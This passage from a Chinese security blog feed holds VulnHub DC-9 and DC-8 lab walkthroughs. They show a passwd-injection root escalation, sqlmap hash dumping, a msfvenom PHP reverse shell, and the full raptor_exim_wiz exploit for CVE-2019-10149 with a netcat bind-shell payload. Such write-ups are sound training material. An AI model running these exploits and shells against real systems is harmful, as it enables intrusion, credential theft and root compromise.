class="line">/opt/devstuff/test.py</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1346.png" alt="图片"></p><p>查看 <code>test.py</code> 文件得到了它的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1347.png" alt="图片"></p><p>通过代码审计它这个脚本是通过 <code>sys</code> 模块，它是一个简单的<code>数据追加程序</code>。它将使用<code>2</code>个文件<code>作为参数</code>，然后将<code>第一个文件</code>的<code>内容附加</code>到<code>第二个文件</code>中。</p><p>关于 <code>sys</code> 模块大家可以看看这篇文章：<a href="https://blog.csdn.net/anndy_/article/details/76824540">https://blog.csdn.net/anndy_/article/details/76824540</a></p><p>最后我们通过 <code>openssl</code> 生成了一个账号密码然后写入到了 <code>passwd</code> ：</p><p>关于 <code>openssl</code> 可以看看这篇文章：<a href="https://www.jianshu.com/p/e311a6537467">https://www.jianshu.com/p/e311a6537467</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt saul 123456</span><br><span class="line"># 生成 passwd 密码的 hash 值</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1348.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;saul:$1$saul$HqxyWB6MwTZbm/LiAFFZX.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /tmp/raj</span><br><span class="line"><span class="comment"># 在 tmp 创建一个 raj 文件，里面是我们的密码</span></span><br><span class="line">sudo ./<span class="built_in">test</span> /tmp/raj /etc/passwd</span><br><span class="line"><span class="comment"># 运行 test 文件 把 raj 里的内容追加到 /etc/passwd 里</span></span><br><span class="line">su saul</span><br><span class="line"><span class="comment"># 切换用户到 saul 成功获取 root 权限</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1349.png" alt="图片"></p><p>最终也是在 <code>/root</code> 目录下拿到了 <code>Flag</code> 文件！</p><p>至此 DC 系列靶机已经完结~</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-DC_8-Walkthrough</title>
      <link href="/2020/03/09/Vulnhub-DC-8/"/>
      <url>/2020/03/09/Vulnhub-DC-8/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=528306&auto=1&height=66"></iframe><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>DC-8是另一个专门构建的易受攻击的实验室，目的是在渗透测试领域积累经验。</p><p>这个挑战有点复杂，既是实际挑战，又是关于在Linux上安装和配置的两因素身份验证是否可以阻止Linux服务器被利用的“概念证明”。</p><p>由于在Twitter上询问了有关双重身份验证和Linux的问题，也由于@ theart42的建议，最终导致了该挑战的“概念验证”部分。</p><p>这项挑战的最终目标是绕过两因素身份验证，获得root权限并读取唯一的标志。</p><p>下载地址：<a href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a></p><h2 id="运用的知识点"><a href="#运用的知识点" class="headerlink" title="运用的知识点"></a>运用的知识点</h2><p><code>Drupal 7</code> SQL注入<br><code>john</code>破解<code>HASH</code><br><code>Drupal 7</code> 后台编辑页面 <code>Getshell</code><br><code>exim</code>SUID本地提权</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机先对它的 <code>IP</code> 进行端口扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.147</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1297.png" alt="图片"></p><p>由上图可见，它开放了 <code>22</code>（ssh）、<code>80</code>（http）两个服务端口，而 <code>NMAP</code> 帮我们检测出靶机的 <code>CMS</code> 是 <code>Drupal 7</code>！我寻思<code>DC</code>系列的靶机都是这个<code>CMS</code>？不废话，我们先来看看它的<code>web</code>页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.147/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1298.png" alt="图片"></p><h2 id="Drupal-7-SQL注入"><a href="#Drupal-7-SQL注入" class="headerlink" title="Drupal 7 SQL注入"></a>Drupal 7 SQL注入</h2><p>经过在页面上的侦查，我发现有三个页面引起了我的注意：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1299.png" alt="图片"></p><p>他们的参数是 <code>http://192.168.1.147/?nid=1</code> ，看上去像是一个<code>SQL注入</code>点，于是我手工判断是否存在注入，<code>nid=2-1</code>，结果它返回了<code>nid=1</code> 的页面，说明它存在注入！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1300.png" alt="图片"></p><p>随后掏出我的<code>SQLMAP</code>神器上去就是一顿梭哈获取到了管理员的账号和加密的<code>HASH</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 192.168.1.147/?nid=2 -D d7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: d7db                                                                                                                                                                                              </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1301.png" alt="图片"></p><h2 id="john破解HASH"><a href="#john破解HASH" class="headerlink" title="john破解HASH"></a>john破解HASH</h2><p>紧接着我用 <code>KALI</code> 自带的 <code>john</code> 开膛手杰克对他们两个密码一一破解！破解 <code>admin</code> 的 <code>HASH</code> 破解不出来：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1302.png" alt="图片"></p><p>破解 <code>john</code> 的密码为 <code>turtle</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1303.png" alt="图片"></p><p>获取到 <code>john</code> 的密码后我用它的密码登陆到了网站后台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.147/user</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1304.png" alt="图片"></p><h2 id="Drupal-7-后台编辑页面-Getshell"><a href="#Drupal-7-后台编辑页面-Getshell" class="headerlink" title="Drupal 7 后台编辑页面 Getshell"></a>Drupal 7 后台编辑页面 Getshell</h2><p>登陆到网站的后台后我们需要获取到<code>webshell</code>！我在网站的 <code>Webform</code> 找到了可以编辑 <code>PHP</code> 的页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1305.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1306.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1307.png" alt="图片"></p><p>这个和 <code>DC-7</code> 靶机有点类似，都是通过后台编辑 <code>PHP</code> 页面来获取到 <code>webshell</code>！我首先是用 <code>MSF</code> 生成了一段 <code>payload</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.128 lport=9999 -f raw</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1308.png" alt="图片"></p><p>然后开启 <code>MSF</code> 监听模式：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1309.png" alt="图片"></p><p>最后把刚刚 <code>MSF</code> 生成的 <code>Payload</code> 放到网站的 <code>PHP</code> 编辑页面里：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1310.png" alt="图片"></p><p>保存后来到网站的 <code>Contact Us</code> 提交页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1311.png" alt="图片"></p><p>这个时候 <code>Metasploit</code> 就成功反弹得到了一枚 <code>shell</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1312.png" alt="图片"></p><p>先让它切换到 <code>shell</code> 环境 然后使用 <code>Python</code> 得到一个 <code>bash</code> shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1313.png" alt="图片"></p><p>获取到 <code>shell</code> 之后，我切换到 <code>/home</code> 目录发现只有一个用户 <code>dc8user</code>，但是它里面没有什么文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1314.png" alt="图片"></p><h2 id="exim本地提权获取Flag"><a href="#exim本地提权获取Flag" class="headerlink" title="exim本地提权获取Flag"></a>exim本地提权获取Flag</h2><p>随后我使用 <code>find</code> 命令来查找具有 <code>SUID</code> 权限的文件命令发现了一个 <code>exim4</code>：</p><p>（PS：<code>Exim</code>是一个MTA（Mail Transfer Agent，<code>邮件传输代理</code>）服务器软件，该软件基于GPL协议开发，是一款开源软件。 该软件主要运行于类UNIX系统。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1315.png" alt="图片"></p><p>然后我又看了看 <code>exim</code> 的版本发现它的版本是 <code>4.8.9</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim --version</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1316.png" alt="图片"></p><p>得到了软件的版本信息那么我们就可以去到 <code>exploit-db</code> 上去搜索有关于这个软件版本的相关漏洞：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1317.png" alt="图片"></p><p>由上图可见，它由两个 <code>POC</code>，一个是基于 <code>Metasploit</code> 的，一个是其他的！在 <code>OSCP</code> 考试中 <code>Metasploit</code> 只能使用一次，所以说我们不到万不得已尽量就不要使用 <code>Metasploit</code>！这是关于它的介绍和 <code>EXP</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit</span></span><br><span class="line"><span class="comment"># Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A flaw was found in Exim versions 4.87 to 4.91 (inclusive). </span></span><br><span class="line"><span class="comment"># Improper validation of recipient address in deliver_message() </span></span><br><span class="line"><span class="comment"># function in /src/deliver.c may lead to remote command execution.</span></span><br><span class="line"><span class="comment"># (CVE-2019-10149)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This is a local privilege escalation exploit for &quot;The Return </span></span><br><span class="line"><span class="comment"># of the WIZard&quot; vulnerability reported by the Qualys Security </span></span><br><span class="line"><span class="comment"># Advisory team.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment"># Qualys Security Advisory team (kudos for your amazing research!)</span></span><br><span class="line"><span class="comment"># Dennis &#x27;dhn&#x27; Herrmann (/dev/tcp technique)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage (setuid method):</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line"><span class="comment"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span></span><br><span class="line"><span class="comment"># $ ./raptor_exim_wiz -m setuid</span></span><br><span class="line"><span class="comment"># Preparing setuid shell helper...</span></span><br><span class="line"><span class="comment"># Delivering setuid payload...</span></span><br><span class="line"><span class="comment"># [...]</span></span><br><span class="line"><span class="comment"># Waiting 5 seconds...</span></span><br><span class="line"><span class="comment"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span></span><br><span class="line"><span class="comment"># # id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage (netcat method):</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line"><span class="comment"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span></span><br><span class="line"><span class="comment"># $ ./raptor_exim_wiz -m netcat</span></span><br><span class="line"><span class="comment"># Delivering netcat payload...</span></span><br><span class="line"><span class="comment"># Waiting 5 seconds...</span></span><br><span class="line"><span class="comment"># localhost [127.0.0.1] 31337 (?) open</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Vulnerable platforms:</span></span><br><span class="line"><span class="comment"># Exim 4.87 - 4.91</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Tested against:</span></span><br><span class="line"><span class="comment"># Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">METHOD=<span class="string">&quot;setuid&quot;</span> <span class="comment"># default method</span></span><br><span class="line">PAYLOAD_SETUID=<span class="string">&#x27;$&#123;run&#123;\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22&#125;&#125;@localhost&#x27;</span></span><br><span class="line">PAYLOAD_NETCAT=<span class="string">&#x27;$&#123;run&#123;\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22&#125;&#125;@localhost&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># usage instructions</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">usage</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$0</span> [-m METHOD]&quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-m setuid : use the setuid payload (default)&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-m netcat : use the netcat payload&quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload delivery</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">exploit</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># connect to localhost:25</span></span><br><span class="line"><span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/localhost/25</span><br><span class="line"></span><br><span class="line"><span class="comment"># deliver the payload</span></span><br><span class="line"><span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;helo localhost&quot;</span> &gt;&amp;3</span><br><span class="line"><span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mail from:&lt;&gt;&quot;</span> &gt;&amp;3</span><br><span class="line"><span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;rcpt to:&lt;<span class="variable">$PAYLOAD</span>&gt;&quot;</span> &gt;&amp;3</span><br><span class="line"><span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;data&quot;</span> &gt;&amp;3</span><br><span class="line"><span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..31&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Received: <span class="variable">$i</span>&quot;</span> &gt;&amp;3</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;.&quot;</span> &gt;&amp;3</span><br><span class="line"><span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;quit&quot;</span> &gt;&amp;3</span><br><span class="line"><span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># print banner</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># parse command line</span></span><br><span class="line"><span class="keyword">while</span> [ ! -z <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">-m) <span class="built_in">shift</span>; METHOD=<span class="string">&quot;<span class="variable">$1</span>&quot;</span>; <span class="built_in">shift</span>;;</span><br><span class="line">* ) usage</span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$METHOD</span> ]; <span class="keyword">then</span></span><br><span class="line">usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setuid method</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$METHOD</span> = <span class="string">&quot;setuid&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare a setuid shell helper to circumvent bash checks</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Preparing setuid shell helper...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;main()&#123;setuid(0);setgid(0);system(\&quot;/bin/sh\&quot;);&#125;&quot;</span> &gt;/tmp/pwned.c</span><br><span class="line">gcc -o /tmp/pwned /tmp/pwned.c 2&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Problems compiling setuid shell helper, check your gcc.&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Falling back to the /bin/sh method.&quot;</span></span><br><span class="line">cp /bin/sh /tmp/pwned</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># select and deliver the payload</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Delivering <span class="variable">$METHOD</span> payload...&quot;</span></span><br><span class="line">PAYLOAD=<span class="variable">$PAYLOAD_SETUID</span></span><br><span class="line">exploit</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for the magic to happen and spawn our shell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Waiting 5 seconds...&quot;</span></span><br><span class="line">sleep 5</span><br><span class="line">ls -l /tmp/pwned</span><br><span class="line">/tmp/pwned</span><br><span class="line"></span><br><span class="line"><span class="comment"># netcat method</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$METHOD</span> = <span class="string">&quot;netcat&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># select and deliver the payload</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Delivering <span class="variable">$METHOD</span> payload...&quot;</span></span><br><span class="line">PAYLOAD=<span class="variable">$PAYLOAD_NETCAT</span></span><br><span class="line">exploit</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for the magic to happen and spawn our shell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Waiting 5 seconds...&quot;</span></span><br><span class="line">sleep 5</span><br><span class="line">nc -v 127.0.0.1 31337</span><br><span class="line"></span><br><span class="line"><span class="comment"># print help</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">usage</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1318.png" alt="图片"></p><p>然后我吧 <code>exp</code> 复制到了 <code>root.sh</code> 里，当然你也可以吧这个 <code>exp</code> 下载到本地，再由本地上传到靶机服务器里，但是我嫌它麻烦，我直接 <code>vi</code> 编辑进去就可以了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1319.png" alt="图片"></p><p>一切就绪之后先给它一个可执行的权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 root.sh</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1320.png" alt="图片"></p><p>按照脚本的提示运行 <code>root.sh</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./root.sh -m netcat</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1321.png" alt="图片"></p><p>然后 KALI 监听 <code>4444</code> 端口获取到一枚 <code>root</code> 权限的 shell：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1322.png" alt="图片"></p><p>最终也是在 <code>/root</code> 目录下获取到了 <code>Flag</code>！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-DC_7-Walkthrough</title>
